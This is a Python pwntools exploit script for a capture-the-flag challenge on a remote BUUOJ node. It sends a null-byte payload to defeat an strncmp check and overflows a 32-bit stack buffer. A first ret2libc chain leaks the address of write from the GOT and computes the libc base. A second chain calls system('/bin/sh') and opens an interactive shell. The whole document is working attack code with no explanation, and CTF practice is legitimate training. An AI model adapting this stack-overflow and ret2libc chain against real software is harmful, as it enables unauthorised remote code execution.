#!/usr/bin/env python
#-*-coding=UTF-8-*-

from pwn import *

sh = remote('node3.buuoj.cn',28548)

elf = ELF('./pwn')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x08048825

libc = ELF('./libc-2.23.so')
libc_system_addr = libc.symbols['system']
libc_binsh_addr = next(libc.search('/bin/sh'))
libc_write_addr = libc.symbols['write']

bypass_payload = '\x00' #bypass strncmp() 
bypass_payload += '\xff'*7 
sh.sendline(bypass_payload)

offset2ebp = 0xe7
leak_payload = 'a'*offset2ebp + 'aaaa'
leak_payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got)

sh.sendlineafter('Correct\n',leak_payload)

leak_write_addr = u32(sh.recv()[0:4])

libc_baseaddr = leak_write_addr - libc_write_addr
system_addr = libc_system_addr + libc_baseaddr
binsh_addr = libc_binsh_addr + libc_baseaddr

sh.sendline(bypass_payload)
payload = 'a'*offset2ebp + 'bbbb'
payload += p32(system_addr) + 'retn' + p32(binsh_addr)
sh.sendlineafter('Correct\n',payload)
sh.interactive()